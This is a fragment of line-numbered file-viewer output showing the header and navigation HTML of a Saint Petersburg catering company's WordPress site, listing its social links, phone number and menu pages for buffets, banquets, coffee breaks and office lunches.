+   167→   167→
+   168→   168→                        <div class="header-logo">
+   169→   169→
+   170→   170→                                
+   171→   171→
+   172→   172→                                
+   173→   173→                                        
+   174→   174→        <div class="header-socials">
+   175→   175→
+   176→   176→                                        <a href="https://www.facebook.com/furshetspb/" target="_blank">
+   177→   177→                                <span class="header-socials-icon"><i class="fab fa-facebook-f"></i></span>
+   178→   178→                                                        </a>
+   179→   179→                
+   180→   180→                                        <a href="https://vk.com/nilovcatering" target="_blank">
+   181→   181→                                <span class="header-socials-icon"><i class="fab fa-vk"></i></span>
+   182→   182→                                                        </a>
+   183→   183→                
+   184→   184→                                        <a href="http://www.instagramm.com/nilov_catering" target="_blank">
+   185→   185→                                <span class="header-socials-icon"><i class="fab fa-instagram"></i></span>
+   186→   186→                                                        </a>
+   187→   187→                
+   188→   188→                
+   189→   189→        </div>
+   190→   190→
+   191→   191→        
+   192→   192→                                        <a href="https://interfood-catering.ru/" title="Кейтеринг СПб" class="logo-img">
+   193→   193→
+   194→   194→                                                <img src="https://interfood-catering.ru/wp-content/uploads/2021/01/Group-1-1.png" alt="Кейтеринг СПб">
+   195→   195→
+   196→   196→                                        </a>
+   197→   197→
+   198→   198→                                        <a href="https://interfood-catering.ru/" title="Кейтеринг СПб" class="logo-img-mob" style="display: none;">
+   199→   199→                                                <object data="/wp-content/themes/bard/assets/images/logo.svg" type="image/svg+xml"></object>
+   200→   200→                                                <!-- <img src="/wp-content/themes/bard/assets/images/logo.svg" alt="Кейтеринг СПб"> -->
+   201→   201→                                                <img src="/wp-content/themes/bard/assets/images/header.png" alt="Кейтеринг СПб">
+   202→   202→                                        </a>
+   203→   203→
+   204→   204→                                        <a href="tel:+78129195911" class="header-phone">+7 (812) 919-59-11</a>
+   205→   205→
+   206→   206→                                
+   207→   207→                                
+   208→   208→                                <div class="main-nav-order mob-order" style="display: none;">
+   209→   209→                                        Оставить заявку
+   210→   210→                                </div>
+   211→   211→                                <p class="site-description">Кейтеринговая компания Interfood Catering</p>
+   212→   212→
+   213→   213→                                
+   214→   214→
+   215→   215→                        </div>
+   216→   216→
+   217→   217→
+   218→   218→
+   219→   219→                </div>
+   220→   220→
+   221→   221→                </div>
+   222→   222→
+   223→   223→        </div>
+   224→   224→
+   225→   225→
+   226→   226→
+   227→   227→
+   228→   228→        
+   229→   229→
+   230→   230→<div id="main-nav" class="clear-fix">
+   231→   231→
+   232→   232→
+   233→   233→
+   234→   234→        <div class="boxed-wrapper">     
+   235→   235→
+   236→   236→                
+   237→   237→
+   238→   238→                <div class="main-nav-buttons">
+   239→   239→
+   240→   240→
+   241→   241→
+   242→   242→                        <!-- Alt Sidebar Icon -->
+   243→   243→
+   244→   244→                        
+   245→   245→
+   246→   246→
+   247→   247→                        <!-- Random Post Button -->                     
+   248→   248→
+   249→   249→                        
+   250→   250→                        
+   251→   251→
+   252→   252→                </div>
+   253→   253→
+   254→   254→
+   255→   255→
+   256→   256→                <!-- Mobile Menu Button -->
+   257→   257→
+   258→   258→                <span class="mobile-menu-btn">
+   259→   259→
+   260→   260→                        <!-- <i class="fas fa-chevron-down"></i> -->
+   261→   261→                        <svg xmlns="http://www.w3.org/2000/svg" width="92" height="92" viewBox="0 0 92 92" fill="none">
+   262→   262→                                <g filter="url(#filter0_d)">
+   263→   263→                                <circle cx="46" cy="44" r="36" fill="white"/>
+   264→   264→                                </g>
+   265→   265→                                <rect x="32" y="34" width="28" height="2" fill="#333333"/>
+   266→   266→                                <rect x="32" y="43" width="28" height="2" fill="#333333"/>
+   267→   267→                                <rect x="32" y="52" width="28" height="2" fill="#333333"/>
+   268→   268→                                <defs>
+   269→   269→                                <filter id="filter0_d" x="0" y="0" width="92" height="92" filterUnits="userSpaceOnUse" color-interpolation-filters="sRGB">
+   270→   270→                                <feFlood flood-opacity="0" result="BackgroundImageFix"/>
+   271→   271→                                <feColorMatrix in="SourceAlpha" type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 127 0"/>
+   272→   272→                                <feOffset dy="2"/>
+   273→   273→                                <feGaussianBlur stdDeviation="5"/>
+   274→   274→                                <feColorMatrix type="matrix" values="0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0.12 0"/>
+   275→   275→                                <feBlend mode="normal" in2="BackgroundImageFix" result="effect1_dropShadow"/>
+   276→   276→                                <feBlend mode="normal" in="SourceGraphic" in2="effect1_dropShadow" result="shape"/>
+   277→   277→                                </filter>
+   278→   278→                                </defs>
+   279→   279→                        </svg>
+   280→   280→                </span>
+   281→   281→
+   282→   282→
+   283→   283→                <div class="main-nav-menu">
+   284→   284→                <nav class="main-menu-container"><ul id="main-menu" class=""><li id="menu-item-14" class="menu-item menu-item-type-custom menu-item-object-custom current-menu-item current_page_item menu-item-14"><a href="/" aria-current="page">Главная</a></li>
+   285→   285→<li id="menu-item-19" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-19"><a href="https://interfood-catering.ru/about">О компании</a>
+   286→   286→<ul class="sub-menu">
+   287→   287→        <li id="menu-item-1271" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-1271"><a href="https://interfood-catering.ru/news">Новости</a></li>
+   288→   288→</ul>
+   289→   289→</li>
+   290→   290→<li id="menu-item-20" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-has-children menu-item-20"><a href="#">Меню</a>
+   291→   291→<ul class="sub-menu">
+   292→   292→        <li id="menu-item-68" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-68"><a href="https://interfood-catering.ru/furshet">Фуршет</a></li>
+   293→   293→        <li id="menu-item-67" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-67"><a href="https://interfood-catering.ru/banket">Банкет</a></li>
+   294→   294→        <li id="menu-item-66" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-66"><a href="https://interfood-catering.ru/kofe-brejk">Кофе-брейк</a></li>
+   295→   295→        <li id="menu-item-306" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-306"><a href="https://interfood-catering.ru/mobilnyj-furshet">Доставка закусок</a></li>
+   296→   296→        <li id="menu-item-2127" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2127"><a href="/wp-content/uploads/pdf/vegetarian_menu.pdf">Вегетарианское</a></li>
+   297→   297→        <li id="menu-item-2128" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-2128"><a href="/wp-content/uploads/pdf/barbecue_menu.pdf">Барбекю</a></li>
+   298→   298→        <li id="menu-item-2271" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-2271"><a href="https://interfood-catering.ru/kompleksnye-obedy-v-ofis">Обеды в офис</a></li>
+   299→   299→</ul>
+   300→   300→</li>
+
+[showing lines 1-300 of 1057; use offset=301 with limit to continue reading]
